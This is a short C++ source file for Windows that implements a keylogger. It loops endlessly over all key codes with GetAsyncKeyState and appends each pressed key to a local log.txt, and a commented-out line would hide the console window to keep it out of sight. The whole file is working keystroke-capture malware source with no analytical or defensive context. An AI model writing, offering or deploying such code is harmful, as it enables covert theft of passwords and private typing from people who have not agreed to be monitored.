
#include <iostream>
#include<Windows.h>
#include<winuser.h>
#include<fstream>


int main()
{
	//ShowWindow(GetConsoleWindow(), SW_HIDE);
	std::ofstream file;
	file.open("log.txt", std::ios::app);
        while (true) {
            for (size_t i = 0; i < 255; i++)
            {
				short keyState = GetAsyncKeyState(char(i));
                if (keyState & 0x0001)
                {
                    file << char(i);
                }
            }
        }
}
